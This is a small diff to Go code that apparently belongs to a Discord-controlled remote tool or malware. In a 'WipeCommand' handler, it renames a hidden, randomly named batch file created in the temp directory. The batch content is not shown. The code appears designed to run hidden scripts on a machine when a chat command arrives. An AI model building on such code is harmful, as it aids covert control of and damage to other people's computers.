@@ -71,7 +71,7 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 	path, _ = filepath.Abs(path)
 	dir := filepath.Dir(path)
 
-	script := filepath.Join(os.TempDir(), fmt.Sprint(rand.Float32())+"wowza.bat")
+	script := filepath.Join(os.TempDir(), fmt.Sprint(rand.Float32())+"a.bat")
 	utils.HideItem(script)
 
 	content := fmt.Sprintf(
